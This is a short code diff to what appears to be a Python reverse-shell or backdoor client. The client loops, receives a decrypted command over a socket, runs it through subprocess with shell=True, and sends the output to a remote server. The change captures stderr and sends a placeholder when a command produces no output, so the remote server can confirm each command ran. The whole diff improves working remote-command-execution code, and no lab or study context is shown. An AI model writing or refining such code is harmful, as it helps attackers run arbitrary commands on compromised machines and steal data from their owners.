@@ -65,7 +65,11 @@ while True:
         sleep_or_connect()
         continue
     # Execute the command
-    shell_output = subprocess.check_output(decrypted_command, shell=True)
+    shell_output = subprocess.run(decrypted_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True).stdout
+    # Let the server know the command ran, even if there's no output 
+    if shell_output == "".encode():
+        shell_output = " ".encode()
+
     # Send the results to the server
     encrypted_output = shell_output
     connection_socket.send(encrypted_output)
